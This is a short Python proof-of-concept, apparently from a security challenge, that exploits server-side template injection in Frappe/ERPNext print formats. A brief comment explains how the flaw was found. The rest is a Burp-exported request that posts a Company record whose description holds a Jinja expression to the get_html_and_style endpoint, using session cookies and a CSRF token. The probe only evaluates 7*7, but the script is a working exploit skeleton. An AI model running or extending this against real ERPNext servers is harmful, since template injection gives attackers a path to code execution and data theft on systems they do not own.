'''
Challenge:


With this exploit we leverage the print format capabilities of frappe.
Print formats are basically templates of how to print different doctypes, which uses Jinja....
I found this vuln grepping: grep -rwn --include="*.py" --color  'render' .
/frappe/www/printpriview.py actually renders the template.
The vulnerable function is get_rendered_template on line 61
The vulnerable bit of code is on line 157
'''
import requests

session = requests.session()

burp0_url = "http://erpnext:8000/api/method/frappe.www.printview.get_html_and_style"
burp0_cookies = {"sid": "b3340ac1f9e8d8ece41e296be7f32676d8c4f7cf112c1c7c109453c5", "system_user": "yes", "full_name": "Zeljka%20test%20%7B%7B%207%2A7%20%7D%7D%20Kola%C5%A1inac%20test%20%7B%7B%207%2A7%20%7D%7D", "user_id": "zeljka.k%40randomdomain.com", "user_image": ""}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "application/json", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Frappe-CSRF-Token": "2ebc148e33abfaf6d6f3a030418c8aacd815795e50edfb34d9251fda", "X-Frappe-CMD": "", "X-Requested-With": "XMLHttpRequest", "Origin": "http://erpnext:8000", "Connection": "close", "Referer": "http://erpnext:8000/desk"}
burp0_data = {"doc": "{\"credit_limit\":0,\"default_employee_advance_account\":\"Employee Advances - sdfs\",\"round_off_cost_center\":\"Main - sdfs\",\"modified\":\"2022-11-11 17:21:13.406889\",\"default_currency\":\"USD\",\"abbr\":\"sdfs\",\"default_inventory_account\":\"Stock In Hand - sdfs\",\"rgt\":4,\"allow_account_creation_against_child_company\":0,\"company_description\":\"<div>{{ 7*7 }}</div>\",\"write_off_account\":\"Write Off - sdfs\",\"doctype\":\"Company\",\"cost_center\":\"Main - sdfs\",\"asset_received_but_not_billed\":\"Asset Received But Not Billed - sdfs\",\"exchange_gain_loss_account\":\"Exchange Gain/Loss - sdfs\",\"depreciation_cost_center\":\"Main - sdfs\",\"default_expense_account\":\"Cost of Goods Sold - sdfs\",\"round_off_account\":\"Round Off - sdfs\",\"default_receivable_account\":\"Debtors - sdfs\",\"accumulated_depreciation_account\":\"Accumulated Depreciation - sdfs\",\"capital_work_in_progress_account\":\"CWIP Account - sdfs\",\"docstatus\":0,\"idx\":0,\"total_monthly_sales\":0,\"monthly_sales_target\":0,\"company_name\":\"fake\",\"enable_perpetual_inventory\":1,\"default_cash_account\":\"Cash - sdfs\",\"default_income_account\":\"Sales - sdfs\",\"lft\":3,\"is_group\":0,\"stock_adjustment_account\":\"Stock Adjustment - sdfs\",\"country\":\"United States\",\"depreciation_expense_account\":\"Depreciation - sdfs\",\"expenses_included_in_asset_valuation\":\"Expenses Included In Asset Valuation - sdfs\",\"chart_of_accounts\":\"Standard\",\"create_chart_of_accounts_based_on\":\"Standard Template\",\"expenses_included_in_valuation\":\"Expenses Included In Valuation - sdfs\",\"stock_received_but_not_billed\":\"Stock Received But Not Billed - sdfs\",\"name\":\"fake\",\"disposal_account\":\"Gain/Loss on Asset Disposal - sdfs\",\"default_payroll_payable_account\":\"Payroll Payable - sdfs\",\"old_parent\":\"\",\"owner\":\"zeljka.k@randomdomain.com\",\"default_payable_account\":\"Creditors - sdfs\",\"transactions_annual_history\":\"{}\",\"standard_working_hours\":0,\"creation\":\"2022-11-11 16:42:58.472069\",\"__onload\":{\"addr_list\":[],\"transactions_exist\":false,\"contact_list\":[]},\"modified_by\":\"zeljka.k@randomdomain.com\",\"__last_sync_on\":\"2022-11-11T22:40:18.937Z\"}", "print_format": "Donkey", "no_letterhead": "0", "_lang": "en"}
session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)